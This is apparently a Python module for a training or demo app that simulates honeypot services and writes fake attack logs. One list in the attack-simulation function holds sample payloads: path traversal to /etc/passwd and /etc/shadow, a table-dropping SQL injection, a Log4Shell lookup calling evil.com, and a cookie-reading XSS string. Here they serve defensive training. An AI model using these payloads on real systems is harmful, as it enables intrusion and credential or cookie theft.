"""
Honeypot service - manages virtual honeypot services that simulate vulnerable
network services to detect and log intrusion attempts.

These are software-based honeypots (no real network listeners) that log
simulated attack traffic and can be integrated with the alert system.
"""
import uuid
import random
from datetime import datetime, timedelta
from app.extensions import db
from app.models.honeypot import HoneypotService, HoneypotLog

# Default honeypot service templates
SERVICE_TEMPLATES = {
    'ssh': {
        'name': 'SSH Honeypot',
        'port': 2222,
        'banner': 'SSH-2.0-OpenSSH_7.4',
        'interaction_level': 'high',
        'responses': {
            'login': 'Password authentication failed for {username}',
            'shell': 'bash: {command}: command not found',
        },
    },
    'http': {
        'name': 'HTTP Honeypot',
        'port': 8888,
        'banner': 'Apache/2.4.29 (Ubuntu)',
        'interaction_level': 'medium',
        'responses': {
            'get': '<html><head><title>Welcome</title></head><body><h1>It works!</h1></body></html>',
            'admin': '<html><body><h1>401 Unauthorized</h1></body></html>',
        },
    },
    'ftp': {
        'name': 'FTP Honeypot',
        'port': 2121,
        'banner': '220 (vsFTPd 3.0.3)',
        'interaction_level': 'medium',
        'responses': {
            'login': '530 Login incorrect.',
            'anonymous': '230 Login successful.',
        },
    },
    'telnet': {
        'name': 'Telnet Honeypot',
        'port': 2323,
        'banner': 'Ubuntu 18.04 LTS\nlogin: ',
        'interaction_level': 'high',
        'responses': {
            'login': 'Login incorrect',
        },
    },
    'smtp': {
        'name': 'SMTP Honeypot',
        'port': 2525,
        'banner': '220 mail.example.com ESMTP Postfix',
        'interaction_level': 'low',
        'responses': {
            'helo': '250 mail.example.com',
            'mail': '250 2.1.0 Ok',
            'rcpt': '550 5.1.1 <{address}>: Recipient address rejected',
        },
    },
    'mysql': {
        'name': 'MySQL Honeypot',
        'port': 3307,
        'banner': '5.7.34-0ubuntu0.18.04.1',
        'interaction_level': 'medium',
        'responses': {
            'login': 'ERROR 1045 (28000): Access denied for user \'{username}\'@\'{host}\'',
            'query': 'ERROR 1064 (42000): You have an error in your SQL syntax',
        },
    },
    'rdp': {
        'name': 'RDP Honeypot',
        'port': 3390,
        'banner': 'Microsoft Terminal Services',
        'interaction_level': 'low',
        'responses': {
            'login': 'Authentication failed',
        },
    },
    'redis': {
        'name': 'Redis Honeypot',
        'port': 6380,
        'banner': 'Redis v6.2.6',
        'interaction_level': 'medium',
        'responses': {
            'auth': '-ERR Client sent AUTH, but no password is set',
            'info': '-NOAUTH Authentication required.',
        },
    },
}

# Simulated attacker IPs and behaviors for demo/training
SIMULATED_ATTACKERS = [
    {'ip': '185.234.67.12', 'country': 'Russia', 'behavior': 'brute_force'},
    {'ip': '103.45.78.200', 'country': 'China', 'behavior': 'scanner'},
    {'ip': '45.33.32.156', 'country': 'United States', 'behavior': 'pentest'},
    {'ip': '91.240.118.50', 'country': 'Ukraine', 'behavior': 'botnet'},
    {'ip': '198.51.100.23', 'country': 'Netherlands', 'behavior': 'crawler'},
    {'ip': '203.0.113.42', 'country': 'South Korea', 'behavior': 'exploit'},
    {'ip': '177.54.123.89', 'country': 'Brazil', 'behavior': 'brute_force'},
    {'ip': '196.52.43.88', 'country': 'South Africa', 'behavior': 'scanner'},
]

COMMON_USERNAMES = ['root', 'admin', 'administrator', 'user', 'test', 'ubuntu',
                     'oracle', 'postgres', 'mysql', 'ftp', 'www', 'guest', 'pi']
COMMON_PASSWORDS = ['123456', 'password', 'admin', 'root', 'toor', '12345678',
                     'qwerty', 'letmein', 'master', 'monkey', 'dragon', 'login']


def get_service_templates():
    """Return available honeypot service templates."""
    return SERVICE_TEMPLATES


def create_honeypot(service_type: str) -> HoneypotService | None:
    """Create a new honeypot service from a template."""
    template = SERVICE_TEMPLATES.get(service_type)
    if not template:
        return None

    service = HoneypotService(
        name=template['name'],
        service_type=service_type,
        port=template['port'],
        interaction_level=template['interaction_level'],
        is_active=True,
    )
    db.session.add(service)
    db.session.commit()
    return service


def delete_honeypot(service_id: str) -> bool:
    """Delete a honeypot service and all its logs."""
    service = HoneypotService.query.get(service_id)
    if not service:
        return False
    db.session.delete(service)
    db.session.commit()
    return True


def toggle_honeypot(service_id: str) -> HoneypotService | None:
    """Toggle a honeypot service on/off."""
    service = HoneypotService.query.get(service_id)
    if not service:
        return None
    service.is_active = not service.is_active
    db.session.commit()
    return service


def simulate_attack(service_id: str) -> list[HoneypotLog]:
    """Simulate an attack against a honeypot for training purposes."""
    service = HoneypotService.query.get(service_id)
    if not service or not service.is_active:
        return []

    attacker = random.choice(SIMULATED_ATTACKERS)
    template = SERVICE_TEMPLATES.get(service.service_type, {})
    logs = []
    now = datetime.utcnow()

    # Connection event
    connect_log = HoneypotLog(
        service_id=service.id,
        source_ip=attacker['ip'],
        source_port=random.randint(40000, 65535),
        action='connect',
        payload=f'TCP SYN to port {service.port}',
        threat_level='low',
        country=attacker['country'],
        timestamp=now,
    )
    db.session.add(connect_log)
    logs.append(connect_log)

    # Login attempts based on behavior
    if attacker['behavior'] == 'brute_force':
        num_attempts = random.randint(5, 20)
        for i in range(num_attempts):
            username = random.choice(COMMON_USERNAMES)
            password = random.choice(COMMON_PASSWORDS)
            log = HoneypotLog(
                service_id=service.id,
                source_ip=attacker['ip'],
                source_port=random.randint(40000, 65535),
                action='login_attempt',
                payload=f'USER {username} PASS {password}',
                credentials={'username': username, 'password': password},
                threat_level='high' if i > 5 else 'medium',
                country=attacker['country'],
                timestamp=now + timedelta(seconds=i * 2),
            )
            db.session.add(log)
            logs.append(log)
    elif attacker['behavior'] in ('scanner', 'crawler'):
        log = HoneypotLog(
            service_id=service.id,
            source_ip=attacker['ip'],
            source_port=random.randint(40000, 65535),
            action='command',
            payload=f'Service probe: {template.get("banner", "unknown")}',
            threat_level='medium',
            country=attacker['country'],
            timestamp=now + timedelta(seconds=1),
        )
        db.session.add(log)
        logs.append(log)
    elif attacker['behavior'] == 'exploit':
        exploits = [
            'GET /cgi-bin/../../../../etc/passwd HTTP/1.0',
            "'; DROP TABLE users; --",
            '${jndi:ldap://evil.com/exploit}',
            '../../../etc/shadow',
            '<script>alert(document.cookie)</script>',
        ]
        for i, exploit in enumerate(random.sample(exploits, min(3, len(exploits)))):
            log = HoneypotLog(
                service_id=service.id,
                source_ip=attacker['ip'],
                source_port=random.randint(40000, 65535),
                action='command',
                payload=exploit,
                threat_level='critical',
                country=attacker['country'],
                timestamp=now + timedelta(seconds=i * 3),
            )
            db.session.add(log)
            logs.append(log)

    # Disconnect
    disconnect_log = HoneypotLog(
        service_id=service.id,
        source_ip=attacker['ip'],
        source_port=random.randint(40000, 65535),
        action='disconnect',
        payload='TCP FIN',
        threat_level='low',
        country=attacker['country'],
        timestamp=now + timedelta(seconds=len(logs) * 2 + 1),
    )
    db.session.add(disconnect_log)
    logs.append(disconnect_log)

    # Update service stats
    service.total_connections += 1
    db.session.commit()

    return logs


def get_honeypot_stats() -> dict:
    """Get aggregate honeypot statistics."""
    services = HoneypotService.query.all()
    total_logs = HoneypotLog.query.count()
    critical_logs = HoneypotLog.query.filter_by(threat_level='critical').count()

    # Top attacker IPs
    top_ips = (
        db.session.query(HoneypotLog.source_ip, db.func.count(HoneypotLog.id).label('count'))
        .group_by(HoneypotLog.source_ip)
        .order_by(db.text('count DESC'))
        .limit(10)
        .all()
    )

    # Top targeted services
    top_services = (
        db.session.query(HoneypotService.name, db.func.count(HoneypotLog.id).label('count'))
        .join(HoneypotLog)
        .group_by(HoneypotService.name)
        .order_by(db.text('count DESC'))
        .limit(5)
        .all()
    )

    # Top credentials attempted
    credential_logs = HoneypotLog.query.filter(
        HoneypotLog.credentials.isnot(None)
    ).order_by(HoneypotLog.timestamp.desc()).limit(50).all()

    top_usernames = {}
    top_passwords = {}
    for log in credential_logs:
        creds = log.credentials or {}
        u = creds.get('username', '')
        p = creds.get('password', '')
        if u:
            top_usernames[u] = top_usernames.get(u, 0) + 1
        if p:
            top_passwords[p] = top_passwords.get(p, 0) + 1

    return {
        'total_services': len(services),
        'active_services': sum(1 for s in services if s.is_active),
        'total_connections': total_logs,
        'critical_events': critical_logs,
        'top_attacker_ips': [{'ip': ip, 'count': count} for ip, count in top_ips],
        'top_targeted_services': [{'name': name, 'count': count} for name, count in top_services],
        'top_usernames': sorted(top_usernames.items(), key=lambda x: x[1], reverse=True)[:10],
        'top_passwords': sorted(top_passwords.items(), key=lambda x: x[1], reverse=True)[:10],
    }
